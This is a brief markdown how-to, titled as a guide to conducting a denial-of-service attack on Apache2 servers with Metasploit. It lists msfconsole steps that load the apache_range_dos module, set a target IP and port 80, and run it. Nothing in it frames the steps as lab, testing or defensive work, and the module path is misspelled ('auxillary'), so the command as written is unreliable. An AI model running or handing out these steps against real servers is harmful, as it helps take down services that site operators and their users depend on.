# How to conduct a Apache2 DoS attack
Use Metasploit Framework Console (msfconsole)

## Using msfconsole
- Open the terminal (Ctrl+Alt+T)
- Run ```msfconsole```
- Execute the following commands
```bash
use auxillary/dos/http/apache_range_dos
set RHOST {TARGET IP}
```
- Check the features of the exploit by typing `set`
- Assign RPORT to 80, by:
```
set RPORT 80
```
- Now run the exploit by `run`
